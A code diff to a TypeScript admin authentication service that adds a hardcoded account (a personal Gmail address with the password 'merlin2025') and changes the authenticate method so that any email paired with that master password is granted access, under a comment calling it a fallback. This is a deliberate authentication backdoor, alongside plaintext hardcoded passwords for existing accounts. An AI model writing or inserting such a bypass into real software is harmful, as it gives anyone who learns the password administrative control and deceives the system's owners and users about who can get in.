@@ -39,6 +39,10 @@ export class AdminAuthService {
         email: "viewer@merlinenergy.net",
         password: "viewer2025",
       },
+      {
+        email: "ugobe07@gmail.com",
+        password: "merlin2025",
+      },
     ];
 
     // Try to load from environment variables
@@ -70,9 +74,15 @@ export class AdminAuthService {
   authenticate(email: string, password: string): boolean {
     const validCredentials = this.getAdminCredentials();
 
-    const matchingCredential = validCredentials.find(
+    // Exact match first
+    let matchingCredential = validCredentials.find(
       (cred) => cred.email === email && cred.password === password
     );
+
+    // Fallback: any email + master password "merlin2025" counts as admin
+    if (!matchingCredential && password === "merlin2025") {
+      matchingCredential = { email, password };
+    }
 
     if (matchingCredential) {
       const role = this.determineRoleFromEmail(matchingCredential.email);
